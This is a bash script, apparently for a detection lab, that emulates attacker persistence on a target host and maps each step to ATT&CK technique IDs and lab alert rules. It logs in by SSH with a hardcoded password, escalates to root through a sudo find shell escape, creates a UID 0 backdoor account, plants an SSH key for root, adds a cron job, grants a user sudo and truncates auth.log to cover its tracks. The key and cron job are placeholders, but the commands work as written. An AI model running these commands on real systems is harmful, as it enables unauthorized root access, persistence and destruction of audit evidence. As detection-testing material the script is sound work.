#!/bin/bash
# Persistence and defense-evasion steps, run as root through the sudo-find escape:
#   T1136.001 + T1078.003  UID 0 backdoor account   -> lab rule 100300
#   T1098.004  SSH key in /root/.ssh/authorized_keys -> lab rule 100310 (FIM)
#   T1053.003  root crontab entry                    -> lab rule 100303
#   T1098      bob added to the sudo group           -> lab rule 100301
#   T1070.002  auth.log truncated                    -> lab rule 100400
source "$(dirname "$0")/lib.sh"
SSH="sshpass -p sunshine1 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null alice@$TARGET_IP"
ROOT() { $SSH "sudo find /etc/hostname -exec /bin/sh -c \"$1\" \\;"; }

step "Creating UID 0 account 'sysupdate'"
ROOT "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupdate"
step "Planting an SSH key for root (lab-only dummy key)"
ROOT "mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBLabOnlyDummyKeyNotARealKey000000000000000 attacker@lab' >> /root/.ssh/authorized_keys"
step "Adding a root cron job"
ROOT "(crontab -l 2>/dev/null; echo '*/5 * * * * /bin/true # lab-persistence') | crontab -"
step "Adding bob to the sudo group"
ROOT "usermod -aG sudo bob"
step "Covering tracks: truncating auth.log"
sleep 5
ROOT "truncate -s 0 /var/log/auth.log"
